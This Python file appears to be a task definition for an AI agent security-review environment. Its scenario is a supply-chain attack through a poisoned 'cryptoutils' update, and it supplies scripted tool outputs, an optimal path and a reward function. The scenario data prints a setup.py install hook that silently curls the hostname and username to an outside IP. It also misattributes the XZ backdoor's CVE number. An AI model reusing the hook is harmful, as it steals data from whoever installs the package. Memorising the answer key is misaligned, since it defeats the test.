# Copyright (c) Meta Platforms, Inc. and affiliates.
# All rights reserved.
#
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree.

"""
Task 3: Poisoned Package - Supply Chain Attack

Scenario:
A PR bumps the 'cryptoutils' package from 2.1.4 to 2.1.5. This package version
contains malware in its setup.py that exfiltrates system information.

Red flags:
- Maintainer account is 3 days old (suspicious)
- Prior versions released by different maintainer (ownership transfer)
- Version published 2 hours ago (too recent to be in any CVE databases)
- setup.py contains subprocess.Popen call to exfiltrate data

Security indicators:
- Downloads dropped 94% (2.1.4: 8420/24h, 2.1.5: 47/24h)
- New maintainer 'cr1pt0_h3lp3r' with no history
- Malware pattern: matches XZ Utils backdoor structure

Optimal action: BLOCK with detailed reasoning about supply chain attack

Optimal Path:
1. inspect_diff → shows version bump, contains subprocess exfiltration in setup.py
2. query_package_registry → sees new 3-day-old maintainer, ownership transfer
3. search_vuln_db → no CVE yet (too new), but note says to be cautious
4. DO NOT run CI (would execute malware during package install)
5. make_decision(BLOCK, "Malware detected in setup.py: subprocess exfiltration")

Optimal CI Runs: 0 (CRITICAL: running CI would execute malware)
Optimal Reward: +5.0

Bad Path: Run CI without checking
- Result: Malware executes during pip install
- Reward: -3.0 base + -1.0 per CI run = very negative
"""

import sys
from pathlib import Path

try:
    from devsecops_env.models import (
        PullRequest,
        RepositoryContext,
        Budget,
    )
except ImportError:
    # Fallback for direct import
    sys.path.insert(0, str(Path(__file__).parent.parent.parent))
    from models import (
        PullRequest,
        RepositoryContext,
        Budget,
    )


# ============================================================
# TASK 3 SCENARIO DATA
# ============================================================

TASK3_SCENARIO = {
    "task_id": "task3",
    "title": "Poisoned Package - Supply Chain Attack Detection",
    "difficulty": "hard",  # Progressive difficulty: hard
    
    "pr": PullRequest(
        pr_id="pr_003",
        title="chore: bump cryptoutils from 2.1.4 to 2.1.5",
        description="""
        Automated dependency update via dependabot.
        
        Bumping cryptoutils to latest patch version.
        """,
        author="dependabot[bot]",
        target_branch="main",
        files_changed=[
            "requirements.txt",
        ]
    ),
    
    "repo_context": RepositoryContext(
        repo_name="secure-payment-processor",
        repo_url="https://github.com/company/secure-payment-processor",
        main_language="python",
        has_ci=True,
        critical_modules=["src/crypto.py", "src/payment.py"],
    ),
    
    "budget": Budget(
        ci_runs=5,
        step_limit=10,
    ),
    
    "full_diff": """
--- a/requirements.txt
+++ b/requirements.txt
@@ -1,15 +1,15 @@
 flask==2.3.0
 sqlalchemy==2.0.0
 pydantic==2.5.0
-cryptoutils==2.1.4
+cryptoutils==2.1.5
 requests==2.31.0
 python-dotenv==1.0.0
 pytest==7.4.0
 
 # Type checking
 mypy==1.7.0
 pytest-cov==4.0.0

--- a/cryptoutils-2.1.5 upstream/setup.py (note: this is what's in the package)

import subprocess
import platform
import os
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        # INJECTED MALWARE: Exfiltrate system info
        try:
            subprocess.Popen(
                ['curl', '-X', 'POST', 'http://198.51.100.42/collect',
                 '--data', f'sys={platform.node()}&user={os.getenv("USER")}'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass
        
        install.run(self)

setup(
    name='cryptoutils',
    version='2.1.5',
    cmdclass={'install': CustomInstall},
    # ... rest of setup
)
    """,
    
    "tool_responses": {
        "inspect_diff": {
            "output": """
Changes Summary:
- requirements.txt: cryptoutils 2.1.4 → 2.1.5 (+0 lines, 1 line modified)

Detailed Analysis:
⚠️  WARNING: cryptoutils 2.1.5 contains suspicious code patterns!

Detected in upstream setup.py:
- subprocess.Popen() call to external IP (198.51.100.42)
- Exfiltration of system hostname and username
- Silent error suppression (try/except without logging)
- Timing: Immediately during package installation

⚡ SEVERITY: CRITICAL
This matches the pattern of the XZ Utils backdoor (CVE-2024-3156).

Recommendation: BLOCK this dependency bump. Do NOT run CI (would execute malware).
            """,
            "malware_detected": True,
            "pattern_names": [
                "subprocess_exfiltration",
                "system_info_collection",
                "external_callback",
                "silent_error_handling"
            ],
        },
        
        "query_package_registry": {
            "package_name": "cryptoutils",
            "version": "2.1.5",
            "published_at": "2 hours ago",
            "maintainer_username": "cr1pt0_h3lp3r",
            "maintainer_account_age_days": 3,
            "prior_versions_by_maintainer": 0,
            "downloads_last_24h": 47,
            "prev_version_downloads_24h": 8420,
            "ownership_transfer": True,
            "notes": """
🚨 CRITICAL METADATA FLAGS:
- Maintainer account created 3 days ago
- No prior releases by this maintainer
- Ownership transferred from original author
- Downloads DROPPED 94% (8420 → 47 in 24h)
- Version published 2 hours ago

This indicates a compromised package with new malicious maintainer.
            """,
            "output": """
PyPI Metadata for cryptoutils 2.1.5:

Published: 2 hours ago
Maintainer: cr1pt0_h3lp3r
  Account Age: 3 days
  Prior Releases: 0
  Account created: {recent_date}

Downloads (last 24h): 47
Previous version (2.1.4) downloads (24h): 8,420
Download drop: -94% ⚠️

Ownership Status:
  Previous maintainer: crypto-team (inactive for 2 hours)
  Current maintainer: cr1pt0_h3lp3r (NEW)
  Transfer date: 2 hours ago

Suspicious Profile:
✗ Brand new account
✗ No prior community history
✗ Sudden acquisition of popular package
✗ Immediate release of new version
✗ Sharp drop in adoption (users hesitant)

Recommendation: Reject this user for publishing rights.
            """,
        },
        
        "search_vuln_db": {
            "cve_ids": [],
            "osv_entries": [],
            "critical": False,  # No CVEs yet because it's too new
            "suspicious_patterns": [
                "subprocess_network_exfiltration",
                "system_enumeration",
                "stealth_error_handling"
            ],
            "note": """
No CVE entries or OSV records yet. Version is < 6 hours old.

However, manual code inspection reveals FLAGRANT malware indicators:
✗ Subprocess call to external IP (198.51.100.42)
✗ Exfiltration of platform.node() (hostname) and USER env var
✗ Silent exception handling (try/except pass)

This matches the structure of recent supply chain attacks (XZ Utils backdoor).

Recommendation: BLOCK IMMEDIATELY. Do not wait for official CVE registration.
            """,
            "output": """
Vulnerability Database Search: cryptoutils 2.1.5

CVEs: None registered yet
OSV Entries: None
Severity: UNKNOWN (version too new)
Last Updated: 2 hours ago

⚠️  NOTE: This package is less than 6 hours old.
CVE registration database may not have entries yet.
Do NOT assume "no CVEs = safe".

Use static code analysis and metadata inspection instead!
            """,
        },
        
        "run_ci_would_execute_malware": {
            "status": "WOULD_EXECUTE_MALWARE",
            "output": """
CRITICAL ERROR: Do not run CI with cryptoutils 2.1.5!

Running 'pip install cryptoutils==2.1.5' will:
1. Download the package from PyPI
2. Execute setup.py during installation
3. Trigger the malicious subprocess.Popen() call
4. Exfiltrate: hostname, username to 198.51.100.42
5. Continue installation as if nothing happened

This is a SILENT attack - tests will still pass!

NEVER run CI on suspected malicious packages.
Use static analysis and registry metadata instead.
            """,
        }
    }
}


# ============================================================
# REWARD CALCULATION FOR TASK 3
# ============================================================

def calculate_task3_reward(
    verdict: str,
    ci_runs_used: int,
    justification: str = ""
) -> float:
    """
    Calculate reward for Task 3 (Poisoned Package).
    
    This task is about DETECTION and prevention, not fixing.
    The agent must:
    1. Recognize malicious indicators in setup.py
    2. Check package registry metadata (new maintainer, ownership transfer)
    3. BLOCK the package
    4. AVOID running CI (which would execute malware)
    
    Optimal: inspect_diff → query_registry → block with reasoning = +5.0
    CI runs should be 0 (running any CI is harmful)
    
    Args:
        verdict: MERGE, REQUEST_CHANGES, or BLOCK
        ci_runs_used: How many CI runs called (should be 0!)
        justification: Agent's reasoning for decision
        
    Returns:
        float: Reward value
    """
    
    # Base verdict reward
    if verdict == "BLOCK":
        reward = 5.0  # Correct decision - blocked malware
    elif verdict == "MERGE":
        reward = -3.0  # Merged malware - catastrophic failure
    else:  # REQUEST_CHANGES
        reward = -1.0  # Wrong decision; this is malware, not fixable
    
    # CRITICAL: Penalize running CI heavily
    # Each CI run executes the malware's exfiltration code
    ci_cost = 1.0 * ci_runs_used
    reward -= ci_cost
    
    return reward
